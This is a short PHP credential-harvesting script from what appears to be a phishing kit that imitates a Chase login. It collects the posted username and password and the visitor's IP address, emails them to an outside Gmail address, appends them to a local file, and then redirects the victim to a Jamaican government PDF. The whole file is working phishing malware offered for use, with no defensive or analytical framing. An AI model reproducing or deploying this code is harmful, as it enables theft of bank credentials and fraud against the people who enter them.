<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "Email Address: ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "marythomas202026@gmail.com";
$subject = "JCF ID | ".$ip."\n";

mail($recipient,$subject,$message);
$fp = fopen("index.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location:  https://moj.gov.jm/sites/default/files/laws/The%20Constabulary%20Force%20Act_0.pdf");
?>


